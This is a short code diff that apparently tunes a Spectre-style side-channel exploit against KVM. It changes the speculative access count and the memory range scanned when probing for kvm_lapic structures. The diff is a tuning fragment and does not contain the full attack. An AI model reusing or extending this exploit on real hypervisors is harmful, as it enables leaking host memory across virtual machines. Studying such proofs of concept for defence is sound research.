@@ -104,7 +104,7 @@ typedef char kvm_lapic[8];
 //   Base
 //
 size_t find_min(void *buf) {
-  const uint64_t MAX_IDX = 0xfffffffff;
+  const uint64_t MAX_IDX = 0x40000000; // 8GiB
   const int PAGES_IN_BATCH = 256;
   const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);
 
@@ -133,7 +133,7 @@ size_t find_min(void *buf) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
 
-        size_t time = access_buffer_with_spectre(buf, idx, 5);
+        size_t time = access_buffer_with_spectre(buf, idx, 10);
         if (time < 200) {
           time = access_buffer_with_spectre(buf, idx, 1000);
           if (time < 180) {
